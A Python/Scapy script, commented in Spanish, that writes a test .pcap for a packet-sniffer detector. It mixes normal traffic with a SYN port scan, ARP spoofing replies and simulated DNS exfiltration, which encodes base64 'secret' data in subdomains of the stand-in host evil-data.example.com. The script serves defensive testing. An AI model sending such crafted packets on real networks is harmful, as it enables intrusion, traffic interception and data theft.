#!/usr/bin/env python3
"""
Genera un archivo .pcap con tráfico malicioso de ejemplo para probar
el packet_sniffer.py.

Genera:
  1. Escaneo de puertos TCP SYN (20 puertos distintos desde una IP)
  2. ARP spoofing (3 replies con MACs distintas para la misma IP)
  3. DNS exfiltration (consultas con dominios largos y frecuentes)
  4. Tráfico normal de fondo (TCP, UDP, ICMP)

Uso:
    python generate_pcap.py
    python generate_pcap.py -o escenario_custom.pcap
"""

import argparse
import random

try:
    from scapy.all import (
        IP,
        TCP,
        UDP,
        ICMP,
        DNS,
        DNSQR,
        DNSRR,
        ARP,
        Ether,
        wrpcap,
        Raw,
    )
except ImportError:
    print("[!] Scapy no está instalado. Ejecuta: pip install scapy")
    exit(1)


def random_ip():
    return f"{random.choice([10, 172, 192])}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"


SRC_MAC = "00:11:22:33:44:55"
DST_MAC = "ff:ff:ff:ff:ff:ff"


def _wrap_eth(pkt):
    """Envuelve un paquete IP en Ether para linktype consistente."""
    return Ether(src=SRC_MAC, dst=DST_MAC) / pkt


def generate_port_scan(src_ip="10.0.0.99", dst_ip="10.0.0.1", count=20):
    """Escaneo SYN a múltiples puertos."""
    pkts = []
    ports = random.sample(range(1, 1024), count)
    for port in ports:
        pkt = _wrap_eth(
            IP(src=src_ip, dst=dst_ip)
            / TCP(sport=random.randint(49152, 65535), dport=port, flags="S")
        )
        pkts.append(pkt)
    return pkts


def generate_normal_tcp(count=15):
    """Tráfico TCP normal: conexiones a puertos comunes (80, 443)."""
    pkts = []
    for _ in range(count):
        src_ip = random_ip()
        dst_ip = random_ip()
        sport = random.randint(49152, 65535)
        dport = random.choice([80, 443, 8080, 3000, 5432])
        pkts.append(
            _wrap_eth(
                IP(src=src_ip, dst=dst_ip)
                / TCP(sport=sport, dport=dport, flags="PA")
                / Raw(load=b"GET / HTTP/1.1\r\nHost: example.com\r\n\r\n")
            )
        )
        pkts.append(
            _wrap_eth(
                IP(src=dst_ip, dst=src_ip)
                / TCP(sport=dport, dport=sport, flags="PA")
                / Raw(load=b"HTTP/1.1 200 OK\r\nContent-Length: 0\r\n\r\n")
            )
        )
    return pkts


def generate_normal_udp(count=10):
    """Tráfico UDP normal."""
    pkts = []
    for _ in range(count):
        pkts.append(
            _wrap_eth(
                IP(src=random_ip(), dst=random_ip()) / UDP(
                    sport=random.randint(49152, 65535),
                    dport=random.choice([53, 443, 123]),
                )
            )
        )
    return pkts


def generate_normal_icmp(count=8):
    """ICMP echo request/reply."""
    pkts = []
    for _ in range(count):
        src = random_ip()
        dst = random_ip()
        pkts.append(_wrap_eth(IP(src=src, dst=dst) / ICMP(type=8)))
        pkts.append(_wrap_eth(IP(src=dst, dst=src) / ICMP(type=0)))
    return pkts


def generate_arp_spoofing(victim_ip="10.0.0.5", gateway_ip="10.0.0.1", count=5):
    """Múltiples ARP replies con MACs distintas para la misma IP (spoofing)."""
    pkts = []
    spoofed_macs = [
        "aa:bb:cc:dd:ee:01",
        "aa:bb:cc:dd:ee:02",
        "aa:bb:cc:dd:ee:03",
        "aa:bb:cc:dd:ee:04",
        "aa:bb:cc:dd:ee:05",
    ]
    real_mac = "00:11:22:33:44:55"
    # Tráfico ARP normal primero
    pkts.append(
        Ether(src=real_mac, dst="ff:ff:ff:ff:ff:ff")
        / ARP(op="who-has", pdst=gateway_ip, psrc=victim_ip)
    )
    # Spoofed replies
    for i in range(min(count, len(spoofed_macs))):
        pkts.append(
            Ether(src=spoofed_macs[i], dst="ff:ff:ff:ff:ff:ff")
            / ARP(op="is-at", psrc=gateway_ip, pdst=victim_ip, hwsrc=spoofed_macs[i])
        )
    return pkts


def generate_dns_exfiltration(src_ip="10.0.0.77", dst_dns="8.8.8.8", count=25):
    """Consultas DNS con dominios largos y frecuentes (exfiltración)."""
    pkts = []
    # Datos exfiltrados codificados en subdominios (más de 80 chars en total)
    encoded_chunks = [
        "aGVsbG8gd29ybGQgdGhpcyBpcyBzZWNyZXQgZGF0YSBlbmNvZGVk",
        "c3VwZXIgc2VjcmV0IHBhc3N3b3JkIDEyMzQ1Njc4OTBhbWZrbmQ",
        "QmFua2luZyBjcmVkZW50aWFsIGRhdGEgaGVyZSBzdXBlciBsYXJn",
        "U5SNSBLRVkgU1RFUiBTREtGIEpES0ZTR0RLRlMgQUJDRUZHSUpL",
        "bWFsd2FyZSBwYXlsb2FkIGVuY29kZWQgZmlsZSBzZWNyZXQgZGF0",
    ]
    for i in range(count):
        chunk = encoded_chunks[i % len(encoded_chunks)]
        suffix = f"{i:04d}"
        qname = f"{chunk}.{suffix}.evil-data.example.com"
        pkts.append(
            _wrap_eth(
                IP(src=src_ip, dst=dst_dns)
                / UDP(sport=random.randint(49152, 65535), dport=53)
                / DNS(
                    rd=1,
                    qd=DNSQR(qname=qname, qtype="A"),
                )
            )
        )
    return pkts


def generate_dns_normal(count=10):
    """Consultas DNS normales."""
    pkts = []
    domains = [
        "google.com",
        "github.com",
        "stackoverflow.com",
        "python.org",
        "example.com",
        "cloudflare.com",
        "amazon.com",
        "microsoft.com",
        "wikipedia.org",
        "reddit.com",
    ]
    for i in range(count):
        src = random_ip()
        pkts.append(
            _wrap_eth(
                IP(src=src, dst="8.8.8.8")
                / UDP(sport=random.randint(49152, 65535), dport=53)
                / DNS(rd=1, qd=DNSQR(qname=domains[i % len(domains)], qtype="A"))
            )
        )
    return pkts


def main():
    parser = argparse.ArgumentParser(description="Genera PCAP con tráfico malicioso de ejemplo")
    parser.add_argument("-o", "--output", default="test_malicious.pcap",
                        help="Nombre del archivo PCAP de salida")
    args = parser.parse_args()

    print("[*] Generando paquetes...\n")

    all_pkts = []

    print("  [1/7] Escaneo de puertos TCP SYN (20 puertos)")
    all_pkts.extend(generate_port_scan())

    print("  [2/7] Tráfico TCP normal")
    all_pkts.extend(generate_normal_tcp())

    print("  [3/7] Tráfico UDP normal")
    all_pkts.extend(generate_normal_udp())

    print("  [4/7] ICMP echo")
    all_pkts.extend(generate_normal_icmp())

    print("  [5/7] ARP spoofing (5 replies falsas)")
    all_pkts.extend(generate_arp_spoofing())

    print("  [6/7] DNS exfiltration (25 consultas largas)")
    all_pkts.extend(generate_dns_exfiltration())

    print("  [7/7] DNS normal")
    all_pkts.extend(generate_dns_normal())

    random.shuffle(all_pkts)

    wrpcap(args.output, all_pkts)
    print(f"\n[+] PCAP generado: {args.output}")
    print(f"    Total paquetes: {len(all_pkts)}")
    print(f"\n[+] Para probar el sniffer:")
    print(f"    python packet_sniffer.py -r {args.output}")


if __name__ == "__main__":
    main()
